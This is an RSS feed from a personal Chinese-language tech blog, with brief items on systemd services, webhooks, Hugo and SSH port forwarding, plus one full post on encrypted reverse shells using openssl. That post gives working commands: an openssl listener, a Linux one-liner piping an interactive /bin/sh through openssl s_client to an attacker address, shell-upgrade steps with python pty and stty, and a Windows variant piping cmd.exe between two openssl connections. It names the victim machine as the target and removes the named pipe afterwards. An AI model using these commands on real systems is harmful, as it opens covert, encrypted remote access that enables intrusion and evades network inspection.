<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Blog on ZDoc</title>
    <link>http://crkmythical.github.io/blog/</link>
    <description>Recent content in Blog on ZDoc</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>&amp;copy;{year} Mr.Frame, All Rights Reserved</copyright>
    <lastBuildDate>Thu, 27 Jan 2022 18:08:19 +0000</lastBuildDate>
    
        <atom:link href="http://crkmythical.github.io/blog/index.xml" rel="self" type="application/rss+xml" />
    
    
    
      
      <item>
        <title>linux如何添加自定义服务</title>
        <link>http://crkmythical.github.io/blog/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1/</link>
        <pubDate>Thu, 27 Jan 2022 18:08:19 +0000</pubDate>
        
        <guid>http://crkmythical.github.io/blog/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1/</guid>
        <description>编写进度 linux如何添加自定义服务-service命令 添加配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 cat &amp;lt;&amp;lt;EOF &amp;gt;/etc/systemd/system/clash.service [Unit] Description=Clash service After=network.target [Service] Type=simple User=skylee ExecStart=/usr/bin/clash Restart=on-failure RestartPreventExitStatus=23 [Install] WantedBy=multi-user.target 服务操作 1 2 3 systemctl list-units</description>
      </item>
      
      <item>
        <title>Github发送通知给Lark(webhook)</title>
        <link>http://crkmythical.github.io/blog/github%E5%8F%91%E9%80%81%E9%80%9A%E7%9F%A5%E7%BB%99larkwebhook/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://crkmythical.github.io/blog/github%E5%8F%91%E9%80%81%E9%80%9A%E7%9F%A5%E7%BB%99larkwebhook/</guid>
        <description>Beijing: ⛅️ 🌡️+25°C 🌬️↘11km/h Github发送通知给Lark(webhook) Lark Flow配置 webhook配置 webhook address* 1 https://www.larksuite.com/flow/api/trigger-webhook/0350eb63e7657 webhook params 1 2 3 4 5</description>
      </item>
      
      <item>
        <title>hugo搭建博客全记录</title>
        <link>http://crkmythical.github.io/blog/hugo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%85%A8%E8%AE%B0%E5%BD%95/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://crkmythical.github.io/blog/hugo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%85%A8%E8%AE%B0%E5%BD%95/</guid>
        <description>Beijing: ☀️ 🌡️+19°C 🌬️↓4km/h hugo搭建博客全记录 [[https://imcaviare.com/post/auto-deploy-</description>
      </item>
      
      <item>
        <title>SSH</title>
        <link>http://crkmythical.github.io/blog/ssh/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://crkmythical.github.io/blog/ssh/</guid>
        <description>Beijing: ⛈ 🌡️+20°C 🌬️↖7km/h SSH SSH 是安全传输协议 SSH端口转发详解 1 2 3 $ ssh -C -f -N -g -L &amp;lt;listen_port&amp;gt;:&amp;lt;DST_Host&amp;gt;:&amp;lt;DST_port&amp;gt; user@Tunnel_Host $ ssh -C -f -N -g -R &amp;lt;listen_port&amp;gt;:&amp;lt;DST_Host&amp;gt;:&amp;lt;DST_port&amp;gt; user@Tunnel_Host $ ssh -C -f -N -g -D &amp;lt;listen_port&amp;gt; user@Tunnel_Host -C 压缩数据</description>
      </item>
      
      <item>
        <title>个人知识库介绍(Obsidian&#43;hugo)</title>
        <link>http://crkmythical.github.io/blog/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93%E5%8F%8A%E5%8D%9A%E5%AE%A2%E4%BB%8B%E7%BB%8Dobsidian&#43;hugo&#43;githubactions/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://crkmythical.github.io/blog/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93%E5%8F%8A%E5%8D%9A%E5%AE%A2%E4%BB%8B%E7%BB%8Dobsidian&#43;hugo&#43;githubactions/</guid>
        <description>Beijing: ☀️ 🌡️+31°C 🌬️↑11km/h [[https://imcaviare.com/post/auto-deploy-hugo/][hug</description>
      </item>
      
      <item>
        <title>加密反弹Openssl_ReverseShell</title>
        <link>http://crkmythical.github.io/blog/%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9openssl_reverseshell/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://crkmythical.github.io/blog/%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9openssl_reverseshell/</guid>
        <description>&lt;p&gt;Beijing: ☀️   🌡️+31°C 🌬️↑15km/h&lt;/p&gt;
&lt;h1 id=&#34;加密反弹openssl_reverseshell&#34;&gt;加密反弹Openssl_ReverseShell&lt;/h1&gt;
&lt;h2 id=&#34;linux环境&#34;&gt;Linux环境&lt;/h2&gt;
&lt;h3 id=&#34;server&#34;&gt;server&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days &lt;span class=&#34;m&#34;&gt;365&lt;/span&gt; -nodes

openssl s_server -quiet  -key key.pem -cert cert.pem -port &lt;span class=&#34;m&#34;&gt;7777&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;req&lt;/code&gt;   创建和处理证书&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-x509&lt;/code&gt;  专用于生成CA证书&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-newkey rsa:2048&lt;/code&gt;  创建一个使用RSA算法生成2048位的证书和私钥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-keyout key.pem&lt;/code&gt;   私钥保存位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-out cert.pem&lt;/code&gt;     证书保存位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-days 365&lt;/code&gt;  指定证书的有效期限,单位为day，默认365天&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-nodes&lt;/code&gt; : 不加密私钥&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;使用python-pty模块将不完全shell变为完全shell&#34;&gt;使用python pty模块将不完全shell变为完全shell&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;键入-ctrl-z回到-vps-的命令行中再输入如下命令&#34;&gt;键入 Ctrl-Z，回到 VPS 的命令行中，再输入如下命令：&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;stty raw -echo
&lt;span class=&#34;nb&#34;&gt;fg&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;回到不完全shell-中在不完全-shell-中键入-ctrl-l执行&#34;&gt;回到不完全shell 中；在不完全 shell 中键入 Ctrl-l，执行：&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;reset 
&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SHELL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bash 
&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;TERM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;xterm-256color 
stty rows &lt;span class=&#34;m&#34;&gt;54&lt;/span&gt; columns &lt;span class=&#34;m&#34;&gt;104&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此时已经变成了功能齐全的交互式 shell，比如支持命令补全、语法高亮等。&lt;/p&gt;
&lt;h3 id=&#34;client&#34;&gt;client&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mkfifo /tmp/s&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; openssl s_client -quiet -connect 192.168.xx.xx:7777 &amp;gt; /tmp/s&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; rm /tmp/s
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mkfifo /tmp/s&lt;/code&gt;   创建管道&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&amp;amp;1&lt;/code&gt; 打开交互式shell，2&amp;gt;&amp;amp;1的意思是把标准错误输出重定向到标准输出，否则输入错误命令回显会显示在靶机中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;openssl s_client -quiet -connect 192.168.xx.xx:7777 &amp;gt; /tmp/s&lt;/code&gt; 解密流量，将攻击端输入的数据解密后反弹回攻击端&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-quiet&lt;/code&gt; 不打印出session和证书的信息。同时隐式打开&lt;code&gt;-ign_eof&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-ign_eof&lt;/code&gt; 当输入文件到达文件尾的时候并不断开连接&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-connect host:port&lt;/code&gt; 设置服务器地址和端口号。如果没有设置，则默认为本地主机以及端口号4433&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rm /tmp/s&lt;/code&gt;  由于已经加载进内存，清除掉/tmp/s文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows环境&#34;&gt;Windows环境&lt;/h2&gt;
&lt;h3 id=&#34;server-1&#34;&gt;Server&lt;/h3&gt;
&lt;p&gt;服务端开启两个监听，从 ip:port1 获取命令发送给 cmd.exe执行，然后结果返回到 ip:port2。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt;
openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;client-1&#34;&gt;client&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl s_client -quiet -connect 1.1.1.1:443 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cmd.exe &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; openssl s_client -quiet -connect 1.1.1.1:445

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;操作演示&#34;&gt;操作演示&lt;/h1&gt;</description>
      </item>
      
    
  </channel>
</rss>